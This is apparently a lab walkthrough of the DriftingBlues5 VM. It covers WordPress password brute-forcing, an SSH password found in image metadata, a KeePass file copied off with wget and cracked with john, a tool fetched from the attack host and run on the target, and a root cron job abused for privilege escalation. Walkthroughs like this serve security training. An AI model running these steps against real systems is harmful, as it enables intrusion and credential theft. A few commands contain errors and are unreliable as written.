# Driftingblues5

```
nmap -sC -sV 192.168.56.103
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 18:02 CDT
Nmap scan report for 192.168.56.1
Host is up (0.00026s latency).
All 1000 scanned ports on 192.168.56.1 are closed

Nmap scan report for 192.168.56.103
Host is up (0.021s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.6.2
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: diary &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (2 hosts up) scanned in 11.84 seconds
```

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.56.103 -x .php,.html,.zip
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,zip
[+] Timeout:                 10s
===============================================================
2021/04/12 18:35:30 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 301) [Size: 0] [--> http://192.168.56.103/]
/wp-content           (Status: 301) [Size: 321] [--> http://192.168.56.103/wp-content/]
/wp-login.php         (Status: 200) [Size: 6675]                                       
/wp-includes          (Status: 301) [Size: 322] [--> http://192.168.56.103/wp-includes/]
/readme.html          (Status: 200) [Size: 7278]                                        
/wp-trackback.php     (Status: 200) [Size: 135]                                         
/wp-admin             (Status: 301) [Size: 319] [--> http://192.168.56.103/wp-admin/]   
/xmlrpc.php           (Status: 405) [Size: 42]                                          
/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.56.103/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 279]                                                       

===============================================================
2021/04/12 18:41:19 Finished
===============================================================
```

```
cewl -d 3 --with-numbers "http://192.168.56.103/index.php" -w driftingblues5
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

```
wpscan --url http://192.168.56.103/ -e u vp                                                                                                       127 ⨯
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                        Version 3.8.17
      Sponsored by Automattic - https://automattic.com/
      @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.103/ [192.168.56.103]
[+] Started: Mon Apr 12 18:32:57 2021

Interesting Finding(s):

[+] Headers
| Interesting Entry: Server: Apache/2.4.38 (Debian)
| Found By: Headers (Passive Detection)
| Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.103/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:
|  - http://codex.wordpress.org/XML-RPC_Pingback_API
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.103/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.103/wp-content/uploads/
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.103/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
|  - https://www.iplocation.net/defend-wordpress-from-ddos
|  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Latest, released on 2021-02-22).
| Found By: Rss Generator (Passive Detection)
|  - http://192.168.56.103/index.php/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
|  - http://192.168.56.103/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
| Location: http://192.168.56.103/wp-content/themes/twentytwentyone/
| Last Updated: 2021-03-09T00:00:00.000Z
| Readme: http://192.168.56.103/wp-content/themes/twentytwentyone/readme.txt
| [!] The version is out of date, the latest version is 1.2
| Style URL: http://192.168.56.103/wp-content/themes/twentytwentyone/style.css?ver=1.1
| Style Name: Twenty Twenty-One
| Style URI: https://wordpress.org/themes/twentytwentyone/
| Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Css Style In Homepage (Passive Detection)
|
| Version: 1.1 (80% confidence)
| Found By: Style (Passive Detection)
|  - http://192.168.56.103/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] abuzerkomurcu
| Found By: Author Posts - Author Pattern (Passive Detection)
| Confirmed By:
|  Rss Generator (Passive Detection)
|  Wp Json Api (Aggressive Detection)
|   - http://192.168.56.103/index.php/wp-json/wp/v2/users/?per_page=100&page=1
|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
|  Login Error Messages (Aggressive Detection)

[+] gadd
| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
| Confirmed By: Login Error Messages (Aggressive Detection)

[+] gill
| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
| Confirmed By: Login Error Messages (Aggressive Detection)

[+] collins
| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
| Confirmed By: Login Error Messages (Aggressive Detection)

[+] satanic
| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
| Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 12 18:33:02 2021
[+] Requests Done: 66
[+] Cached Requests: 11
[+] Data Sent: 17.192 KB
[+] Data Received: 671.964 KB
[+] Memory used: 166.445 MB
[+] Elapsed time: 00:00:04
```
```
wpscan --url http://192.168.56.103/ -e u -P driftingblues5                                
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.103/ [192.168.56.103]
[+] Started: Mon Apr 12 19:30:02 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.103/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.103/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.103/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.103/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Latest, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.103/index.php/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://192.168.56.103/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.56.103/wp-content/themes/twentytwentyone/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.56.103/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | Style URL: http://192.168.56.103/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.103/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] abuzerkomurcu
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.56.103/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] gadd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gill
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] collins
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] satanic
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 5 user/s
[SUCCESS] - gill / interchangeable                                                                                                                          
Trying abuzerkomurcu / Author Time: 00:03:19 <===========================================================              > (7470 / 9013) 82.88%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: gill, Password: interchangeable

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 12 19:33:26 2021
[+] Requests Done: 7537
[+] Cached Requests: 11
[+] Data Sent: 2.48 MB
[+] Data Received: 53.84 MB
[+] Memory used: 195.387 MB
[+] Elapsed time: 00:03:24
```
Suspicious looking file that wasn't attached to the webpage (downloaded image)
```
exiftool ~/Downloads/dblogopurge.png
ExifTool Version Number         : 12.16
File Name                       : dblogopurge.png
Directory                       : /home/reggie/Downloads
File Size                       : 19 KiB
File Modification Date/Time     : 2021:04:12 19:43:03-05:00
File Access Date/Time           : 2021:04:12 19:43:03-05:00
File Inode Change Date/Time     : 2021:04:12 19:43:03-05:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 300
Image Height                    : 300
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
XMP Toolkit                     : Adobe XMP Core 5.6-c142 79.160924, 2017/07/13-01:06:39
Creator Tool                    : Adobe Photoshop CC 2018 (Windows)
Create Date                     : 2021:02:24 02:55:28+03:00
Metadata Date                   : 2021:02:24 02:55:28+03:00
Modify Date                     : 2021:02:24 02:55:28+03:00
Instance ID                     : xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405
Document ID                     : adobe:docid:photoshop:7232d876-a1d0-044b-9604-08837143888b
Original Document ID            : xmp.did:5890be6c-649b-0248-af9b-19889727200c
Color Mode                      : RGB
ICC Profile Name                : sRGB IEC61966-2.1
Format                          : image/png
History Action                  : created, saved
History Instance ID             : xmp.iid:5890be6c-649b-0248-af9b-19889727200c, xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405
History When                    : 2021:02:24 02:55:28+03:00, 2021:02:24 02:55:28+03:00
History Software Agent          : Adobe Photoshop CC 2018 (Windows), Adobe Photoshop CC 2018 (Windows)
History Changed                 : /
Text Layer Name                 : ssh password is 59583hello of course it is lowercase maybe not
Text Layer Text                 : ssh password is 59583hello of course it is lowercase maybe not :)
Document Ancestors              : adobe:docid:photoshop:871a8adf-5521-894c-8a18-2b27c91a893b
Image Size                      : 300x300
Megapixels                      : 0.090
```

Notice ssh Password

```
ssh gill@192.168.56.103

gill@driftingblues:~$ ls
keyfile.kdbx  user.txt
gill@driftingblues:~$ cat user.txt
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
```

Target machine (driftingblues5)

python3 -m http.Server

* must bin in directory of keyfile.kdbx

Attack machine (kali)

wget http://192.168.56.103:8000/keyfile.kdbx

keepass2john keyfile.kdbx > keyfilepurge.txt
keyfile:$keepass$*2*60000*0*86fe1a63955b5984c0ad76a21f0*e99d45aab90c26200191dbca6b3fae34*e3169392c5eec5e094b1f22a01084f894598280874de2bf8291ea2185051f7e3*78d0b1eb59343754ce0ce33b2efb5e25c595317099a65ed208bfc2f6ab8c8dcd

*https://tzusec.com/cracking-keepass-database/* (resource)

john --wordlist=/usr/share/wordlists/rockyou.txt keyfilepurge.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
No password hashes left to crack (see FAQ)

john --show keyfilepurge.txt                                     
keyfile:porsiempre

1 password hash cracked, 0 left

After a search online I came across a page that would allow me to open this online without a program installation

Hint: keeweb (but its not your typical .com)

The keyfile.kdbx was password protected used password retreved from john

inside this file there were 6 keys

2real4surreal

buddyretard

closet313

exalted

fracturedocean

zakkwylde


```
Attack machine (kali)

python3 -m http.Server

* must be in directory with psp64 in order to uploads

Target machine (driftingblues5)

wget 192.168.56.1/8000/pspy64



```
Attack machine (kali)
python3 -m http.server                     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.56.103 - - [12/Apr/2021 22:20:49] "GET /pspy64 HTTP/1.1" 200 -

Target Machine (Driftingblues5)
gill@driftingblues:~$ wget http://192.168.56.1:8000/pspy64
--2021-04-12 20:02:03--  http://192.168.56.1:8000/pspy64
Connecting to 192.168.56.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64.1’

pspy64.1                               100%[============================================================================>]   2.94M  5.22MB/s    in 0.6s    

2021-04-12 20:02:03 (5.22 MB/s) - ‘pspy64’ saved [3078592/3078592]

chmod +x pspy64

```
./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...



2021/04/12 20:06:23 CMD: UID=0    PID=1      | /sbin/init
2021/04/12 20:07:01 CMD: UID=0    PID=4111   | /usr/sbin/CRON -f
2021/04/12 20:07:01 CMD: UID=0    PID=4112   | /usr/sbin/CRON -f
2021/04/12 20:07:01 CMD: UID=0    PID=4113   | /bin/sh -c /root/key.sh
2021/04/12 20:07:01 CMD: UID=0    PID=4114   | /bin/bash /root/key.sh

noticed a crontab

could not crontab -l created by root
```

```
gill@driftingblues:/keyfolder$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

Example of job definition:
.---------------- minute (0 - 59)
|  .------------- hour (0 - 23)
|  |  .---------- day of month (1 - 31)
|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
|  |  |  |  |
*  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

Looked at test -x in man pages

test -x

-x FILE exists and execute permission is granted

Need to make a file.

Interesting how often this crontab is running
```

```

Navigated to /keyfolder

touch 2real4surreal

touch buddyretard

touch closet313

touch exalted

touch fracturedocean

touch zakkwylde

There is only the need for one of these files to be created. If pspy64 is being used you will have to wait until

This Script is being ran

.---------------- minute (0 - 59)
|  .------------- hour (0 - 23)
|  |  .---------- day of month (1 - 31)
|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
|  |  |  |  |
*  *  *  *  * every minute , every hour, every day, every month, every week

so once the script is updated you will see

```

```
gill@driftingblues:/keyfolder$ ls -al
total 12
drwx---rwx  2 root root 4096 Apr 12 19:50 .
drwxr-xr-x 19 root root 4096 Feb 24 07:27 ..
-rw-r--r--  1 gill gill    0 Apr 12 19:50 fracturedocean
-rw-r--r--  1 root root   29 Apr 12 19:48 rootcreds.txt

gill@driftingblues:/keyfolder$ cat rootcreds.txt
root creds

imjustdrifting31

gill@driftingblues:/keyfolder$ su root
Password:
root@driftingblues:/keyfolder#
```


```
root@driftingblues:~# cat root.txt
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```

### Happy Ethical Hacking ###
